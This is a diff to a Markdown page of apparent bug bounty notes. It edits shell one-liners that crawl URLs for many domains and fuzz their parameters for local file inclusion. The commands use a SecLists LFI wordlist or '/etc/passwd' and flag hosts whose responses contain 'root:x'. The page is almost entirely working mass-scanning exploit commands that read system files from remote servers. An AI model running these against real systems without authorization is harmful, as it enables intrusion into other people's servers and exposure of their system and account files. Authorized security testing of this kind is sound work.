@@ -51,17 +51,21 @@ It may be usefull for bug bounty hunting
 {% endhint %}
 
 ```bash
-# Curl, wordlist
+# Fuzz on multiple domains using a wordlist
 # You may want to edit the wordlist
 cat domains.txt | (gau || hakrawler || waybackurls || katana) | xargs -I% -P 25 sh -c 'for payload in $(cat /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt); do url=$(echo "%" | qsreplace "$payload"); curl -s "$url" 2>&1 | grep -q "root:x" && echo "VULN! $url"; done'
 
-# Curl, single payload
+# Fuzz on multiple urls using a wordlist
+# You may want to edit the wordlist
+gospider -S urls.txt -c 10 -d 5 --blacklist ".(gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| gf lfi | xargs -I% -P 25 sh -c 'for payload in $(cat /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt); do url=$(echo "%" | qsreplace "$payload"); curl -s "$url" 2>&1 | grep -q "root:x" && echo "VULN! $url"; done'
+
+# Fuzz on multiple domains using a single payload
 # You may want to edit the payload
 cat domains.txt | (gau || hakrawler || waybackurls || katana) | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
 
-# GoSpider, signe payload
+# Fuzz on multiple urls using a single payload
 # You may want to edit the payload
-gospider -S urls.txt -c 10 -d 5 --blacklist ".(gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}' gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+gospider -S urls.txt -c 10 -d 5 --blacklist ".(gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
 ```
 {% endtab %}
 {% endtabs %}
